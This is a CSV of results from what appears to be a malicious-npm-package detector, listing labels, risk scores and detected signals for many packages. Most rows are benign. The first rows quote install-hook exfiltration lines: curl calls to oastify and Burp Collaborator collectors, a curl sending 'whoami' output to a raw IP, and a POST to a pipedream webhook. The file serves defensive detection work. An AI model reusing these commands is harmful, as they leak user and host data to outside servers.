package_name,version,label,timestamp,routing,risk_score,confidence,primary_category,confirmed_count,supporting_count,noise_filtered,layer1_count,layer2_count,sources_analyzed,has_js_source,confirmed_signals_json,supporting_signals_json
@grubhubprod/cookbook,9999.9999.2,malicious,2026-03-27T01:53:56.763144,flag,1.0,0.846,network_exfiltration,5,0,0,3,2,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:7\nCode    : headers : { host : 'b7ead99d376f5e70bc778e1724417cbe.m.pipedream.net',"", ""Signal  : Network Request In Install\nLocation: index.js:1\nCode    : const http = require('https');"", ""Signal  : Version contains inflated segment(s) [9999, 9999] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 9999.9999.2"", ""Signal  : Hardcoded external IP(s) in function call: 44.196.248.120\nLocation: index.js:3\nCode    : http.request({   host: '44.196.248.120',   path: '/',   method: 'POST',   headers : { host : 'b7ead99d376f5e70bc778e1724417cbe.m.pipedream.n..."", ""Signal  : Hardcoded external IP(s) in function call: 44.196.248.120\nLocation: entry_point:3\nCode    : http.request({   host: '44.196.248.120',   path: '/',   method: 'POST',   headers : { host : 'b7ead99d376f5e70bc778e1724417cbe.m.pipedream.n...""]",[]
copy-webpack-plugin-v6,6.0.0,malicious,2026-03-27T01:53:56.763755,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 2 file(s): ['package.json', 'pre.sh']""]",[]
core-argos-litelement-artifact,1.0.0,malicious,2026-03-27T01:53:56.764567,skip,0.144,0.72,network_exfiltration,1,0,0,1,0,entry_point,True,"[""Signal  : Curl External Url in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl http://nb231buz8dxj3zn4fix0o88tzk5atz.oastify.com""]",[]
createtile,99.0.0,malicious,2026-03-27T01:53:56.765859,flag,0.7773,0.835,data_exfiltration,2,0,0,2,0,entry_point,True,"[""Signal  : Known webhook/exfiltration collector domain in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : export HOSTNAME && BCNET=\""linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\""; sle"", ""Signal  : Curl External Url in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : export HOSTNAME && BCNET=\""linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\""; sle""]",[]
cron-guru,1.0.2,malicious,2026-03-27T01:53:56.774686,review,0.42,0.9,obfuscation,1,0,1,0,2,entry_point,True,"[""Signal  : Obfuscator tool signature (_0x pattern, 59 occurrences)\nLocation: entry_point:10\nCode    : function _0x2775(_0x2cb828,_0x45dfca){const _0x18d2e4=_0x18d2();return _0x2775=function(_0x277535,_0x5e9d3f){_0x277535=_""]",[]
crypto-standarts,4.1.2,malicious,2026-03-27T01:53:56.785376,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
cryptotickets,99.99.99,malicious,2026-03-27T01:53:56.794226,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:25\nCode    : hostname: \""w1yg57i1m385uznyrs3yls1phgn6bv.burpcollaborator.net\"", //replace burpcollaborator.net with Interactsh or piped"", ""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:11\nCode    : hd: os.homedir(),""]"
cs_kid,2.1.0,malicious,2026-03-27T01:53:56.794977,flag,0.9693,0.835,network_exfiltration,2,0,0,2,0,none,False,"[""Signal  : Hardcoded external IP address '185.215.180.56'\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl 185.215.180.56:9012"", ""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
cs_kid,3.1.0,malicious,2026-03-27T01:53:56.795663,flag,0.9693,0.835,network_exfiltration,2,0,0,2,0,none,False,"[""Signal  : Hardcoded external IP address '185.215.180.56'\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl `whoami`.185.215.180.56:9012"", ""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
@actions/core,1.10.1,benign,2026-03-27T01:53:56.826847,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
@alifd/next,1.26.24,benign,2026-03-27T01:53:56.827890,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@ampproject/remapping,2.2.1,benign,2026-03-27T01:53:56.854339,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
@angular-devkit/core,16.2.3,benign,2026-03-27T01:53:56.862737,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
@ant-design/icons,5.2.6,benign,2026-03-27T01:53:56.868091,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
@apidevtools/json-schema-ref-parser,11.1.0,benign,2026-03-27T01:53:56.898364,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
@apollo/client,3.8.4,benign,2026-03-27T01:53:56.900390,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@assemblyscript/loader,0.27.9,benign,2026-03-27T01:53:56.986944,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
@aws-cdk/aws-ec2,1.204.0,benign,2026-03-27T01:53:56.996087,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
@aws-sdk/credential-provider-sso,3.418.0,benign,2026-03-27T01:53:56.997944,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@aws-sdk/credential-provider-web-identity,3.418.0,benign,2026-03-27T01:53:56.999362,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@aws-sdk/credential-providers,3.418.0,benign,2026-03-27T01:53:57.002719,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@aws-sdk/eventstream-serde-browser,3.374.0,benign,2026-03-27T01:53:57.003920,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@azure/abort-controller,1.1.0,benign,2026-03-27T01:53:57.013167,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@babel/helper-skip-transparent-expression-wrappers,7.22.5,benign,2026-03-27T01:53:57.015971,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@babel/helper-split-export-declaration,7.22.6,benign,2026-03-27T01:53:57.024133,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@babel/helper-string-parser,7.22.5,benign,2026-03-27T01:53:57.053497,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@babel/helper-validator-identifier,7.22.20,benign,2026-03-27T01:53:57.057908,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@babel/helper-validator-option,7.22.15,benign,2026-03-27T01:53:57.059856,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@babel/helper-wrap-function,7.22.20,benign,2026-03-27T01:53:57.070248,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
@emotion/weak-memoize,0.3.1,benign,2026-03-27T01:53:57.071417,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@ethersproject/address,5.7.0,benign,2026-03-27T01:53:57.091520,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
@ethersproject/constants,5.7.0,benign,2026-03-27T01:53:57.098080,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@ethersproject/networks,5.7.1,benign,2026-03-27T01:53:57.121762,skip,0.13,0.65,none,0,1,0,0,1,entry_point,True,[],"[""Signal  : Non-standard URL in function call: https://www.ethercluster.com/mordor\nLocation: entry_point:112\nCode    : etcDefaultProvider(\""https://www.ethercluster.com/mordor\"", \""classicMordor\"")""]"
@ethersproject/properties,5.7.0,benign,2026-03-27T01:53:57.158428,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
@ethersproject/solidity,5.7.0,benign,2026-03-27T01:53:57.172765,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
@ffmpeg-installer/ffmpeg,1.1.0,benign,2026-03-27T01:53:57.178386,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@formatjs/icu-messageformat-parser,2.6.2,benign,2026-03-27T01:53:57.187708,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
@formatjs/intl-localematcher,0.4.2,benign,2026-03-27T01:53:57.192276,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
@google-cloud/paginator,5.0.0,benign,2026-03-27T01:53:57.205088,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@google-cloud/promisify,4.0.0,benign,2026-03-27T01:53:57.219650,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@jest/create-cache-key-function,29.7.0,benign,2026-03-27T01:53:57.228697,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@jest/environment,29.7.0,benign,2026-03-27T01:53:57.229242,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@jest/expect,29.7.0,benign,2026-03-27T01:53:57.232463,skip,0.15,0.75,supply_chain_attack,1,0,0,1,0,entry_point,True,"[""Signal  : Scoped package depends on identically-named public package\nLocation: package.json \u2192 dependencies\nCode    : '@jest/expect' depends on 'expect' @ '^29.7.0'""]",[]
@jest/globals,29.7.0,benign,2026-03-27T01:53:57.233256,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@jest/source-map,29.6.3,benign,2026-03-27T01:53:57.235047,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@jest/test-result,29.7.0,benign,2026-03-27T01:53:57.238586,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@jest/test-sequencer,29.7.0,benign,2026-03-27T01:53:57.265523,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@mui/types,7.2.4,benign,2026-03-27T01:53:57.266093,skip,0.0,0.2,none,0,1,0,1,0,none,False,[],"[""Signal  : Package contains no JavaScript files\nLocation: package file_structure\nCode    : 5 file(s): ['LICENSE', 'OverridableComponentAugmentation.ts', 'README.md', 'index.d.ts', 'package.json']""]"
@oclif/plugin-help,5.2.19,benign,2026-03-27T01:53:57.266971,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@octokit/auth-token,4.0.0,benign,2026-03-27T01:53:57.275359,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@protobufjs/float,1.0.2,benign,2026-03-27T01:53:57.320353,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
@sinonjs/fake-timers,11.1.0,benign,2026-03-27T01:53:57.505015,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
@storybook/store,7.4.4,benign,2026-03-27T01:53:57.509905,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@svgr/babel-plugin-remove-jsx-attribute,8.0.0,benign,2026-03-27T01:53:57.514272,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@swc/helpers,0.5.2,benign,2026-03-27T01:53:57.545747,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
@trysound/sax,0.2.0,benign,2026-03-27T01:53:57.782959,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
@tsconfig/node10,1.0.9,benign,2026-03-27T01:53:57.783536,skip,0.0,0.2,none,0,1,0,1,0,none,False,[],"[""Signal  : Package contains no JavaScript files\nLocation: package file_structure\nCode    : 4 file(s): ['LICENSE', 'README.md', 'package.json', 'tsconfig.json']""]"
glob-parent,6.0.2,benign,2026-03-27T01:53:57.789292,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
glob-promise,6.0.5,benign,2026-03-27T01:53:57.791511,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
glob-to-regexp,0.4.1,benign,2026-03-27T01:53:57.809791,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
glob-watcher,6.0.0,benign,2026-03-27T01:53:57.819902,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
globalyzer,0.1.4,benign,2026-03-27T01:53:57.830818,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
globby,13.2.2,benign,2026-03-27T01:53:57.853732,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
globrex,0.1.2,benign,2026-03-27T01:53:57.901166,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
glslify,7.1.1,benign,2026-03-27T01:53:57.917198,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
gm,1.25.0,benign,2026-03-27T01:53:57.952902,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
grunt-contrib-clean,2.0.1,benign,2026-03-27T01:53:57.970612,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
gzip-size,7.0.0,benign,2026-03-27T01:53:57.977921,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
hammerjs,2.0.8,benign,2026-03-27T01:53:58.263669,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
handlebars-loader,1.7.3,benign,2026-03-27T01:53:58.319528,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
har-schema,2.0.0,benign,2026-03-27T01:53:58.322586,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
hard-source-webpack-plugin,0.13.1,benign,2026-03-27T01:53:58.387368,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
has-bigints,1.0.2,benign,2026-03-27T01:53:58.389083,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
has-unicode,2.0.1,benign,2026-03-27T01:53:58.390934,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
hash.js,1.1.7,benign,2026-03-27T01:53:58.392882,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
hasha,5.2.2,benign,2026-03-27T01:53:58.408706,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
hashids,2.3.0,benign,2026-03-27T01:53:58.409734,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
hashish,0.0.4,benign,2026-03-27T01:53:58.477134,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
hastscript,8.0.0,benign,2026-03-27T01:53:58.479504,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
html-tags,3.3.1,benign,2026-03-27T01:53:58.481907,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
html-to-react,1.6.0,benign,2026-03-27T01:53:58.486392,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
htmlparser2,9.0.0,benign,2026-03-27T01:53:58.508876,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
human-signals,5.0.0,benign,2026-03-27T01:53:58.513790,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
humanize-ms,1.2.1,benign,2026-03-27T01:53:58.515794,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
humps,2.0.1,benign,2026-03-27T01:53:58.530869,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
imports-loader,4.0.1,benign,2026-03-27T01:53:58.531866,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
imurmurhash,0.1.4,benign,2026-03-27T01:53:58.549306,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
indent-string,5.0.0,benign,2026-03-27T01:53:58.552692,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
inferno,8.2.2,benign,2026-03-27T01:53:58.553902,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
io-ts,2.2.20,benign,2026-03-27T01:53:58.790323,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
ionicons,7.1.2,benign,2026-03-27T01:53:58.791273,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
ioredis,5.3.2,benign,2026-03-27T01:53:58.799602,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
ip,2.0.0,benign,2026-03-27T01:53:58.800031,skip,0.0,,none,0,0,0,0,0,none,False,[],[]
ip-address,8.1.0,benign,2026-03-27T01:53:58.807319,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
ip-regex,5.0.0,benign,2026-03-27T01:53:58.813242,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
ipaddr.js,2.1.0,benign,2026-03-27T01:53:58.974725,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
is,3.3.0,benign,2026-03-27T01:53:59.008591,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
is-absolute-url,4.0.1,benign,2026-03-27T01:53:59.010352,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
is-accessor-descriptor,3.0.2,benign,2026-03-27T01:53:59.016098,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
is-alphabetical,2.0.1,benign,2026-03-27T01:53:59.017519,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
is-alphanumerical,2.0.1,benign,2026-03-27T01:53:59.018523,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
is-arguments,1.1.1,benign,2026-03-27T01:53:59.021887,skip,0.0,,none,0,0,1,0,1,entry_point,True,[],[]
javascript-stringify,2.1.0,benign,2026-03-27T01:53:59.039646,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
jayson,4.1.0,benign,2026-03-27T01:53:59.041668,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
jest,29.7.0,benign,2026-03-27T01:53:59.045596,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
jest-canvas-mock,2.5.2,benign,2026-03-27T01:53:59.047864,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
jest-changed-files,29.7.0,benign,2026-03-27T01:53:59.057670,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
jest-circus,29.7.0,benign,2026-03-27T01:53:59.081128,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
jest-cli,29.7.0,benign,2026-03-27T01:53:59.083132,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
jest-config,29.7.0,benign,2026-03-27T01:53:59.128744,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
jest-diff,29.7.0,benign,2026-03-27T01:53:59.148708,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
jest-docblock,29.7.0,benign,2026-03-27T01:53:59.177287,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
jest-each,29.7.0,benign,2026-03-27T01:53:59.196722,skip,0.0,,none,0,0,0,0,0,entry_point,True,[],[]
